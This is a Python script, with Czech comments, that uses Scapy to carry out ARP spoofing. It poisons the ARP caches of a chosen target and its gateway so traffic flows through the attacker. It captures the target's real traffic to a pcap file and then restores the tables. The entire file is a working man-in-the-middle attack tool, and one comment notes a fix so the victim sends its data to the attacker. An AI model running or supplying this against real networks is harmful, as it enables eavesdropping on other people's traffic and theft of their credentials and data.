from scapy.all import ARP, wrpcap, sendp as s, Ether, get_if_hwaddr, conf, AsyncSniffer # Přidány importy pro HW MAC a Sniffing
import time

# --- Main function --- #
def spoof(target_ip, target_mac, ap_ip, ap_mac):
    # Získání vlastní MAC adresy pro správné směrování trafficu k nám
    own_mac = get_if_hwaddr(conf.iface)

    # Vytvoření falešného ARP paketu pro oběť
    # OPRAVA: Přidáno hwsrc=vlastni_mac, aby oběť posílala data útočníkovi
    arp_target = Ether(dst=target_mac) / ARP(op=2, psrc=ap_ip, hwsrc=own_mac, pdst=target_ip, hwdst=target_mac)
    arp_ap = Ether(dst=ap_mac) / ARP(op=2, psrc=target_ip, hwsrc=own_mac, pdst=ap_ip, hwdst=ap_mac)

    # Restore tabulek
    target_restore = Ether(dst=target_mac) / ARP(op=2, psrc=ap_ip, hwsrc=ap_mac, pdst=target_ip, hwdst=target_mac)
    ap_restore = Ether(dst=ap_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=ap_ip, hwdst=ap_mac)

    # Funkce pro výpis zachycených paketů do konzole
    def packet_callback(pkt):
        if pkt.haslayer(Ether):
            print(f"[DATA] {pkt.summary()}")

    # Spuštění snifferu na pozadí (chytá reálná data, ne jen ARP)
    sniffer = AsyncSniffer(iface=conf.iface, filter=f"host {target_ip}", prn=packet_callback)
    sniffer.start()

    try: 
        print(f"Sending spoofed ARP packets to {target_ip} and {ap_ip}... (Press Ctrl+C to stop)")
        while True:
            s(arp_target, verbose=False)
            s(arp_ap, verbose=False)
            
            time.sleep(2)

    except KeyboardInterrupt:   
        print("\nStopping ARP spoofing and restoring network...")
        
        # Zastavení odposlechu
        captured_packets = sniffer.stop()

        # Odeslání správných ARP paketů pro obnovení sítě
        s(target_restore, verbose=False, count=5)
        s(ap_restore, verbose=False, count=5)

        print(f"Network restored. Captured {len(captured_packets)} packets.")
        
        # Uložení reálné komunikace do .pcap souboru
        if captured_packets:
            wrpcap("capture.pcap", captured_packets)
            print("Communication saved to capture.pcap")
        
        print("Program terminated.")
    except Exception:
        print("\n[!] An error occurred. Stopping the spoofing...")
        sniffer.stop()
        s(target_restore, verbose=False, count=5)
        s(ap_restore, verbose=False, count=5)
        print("Network restored.")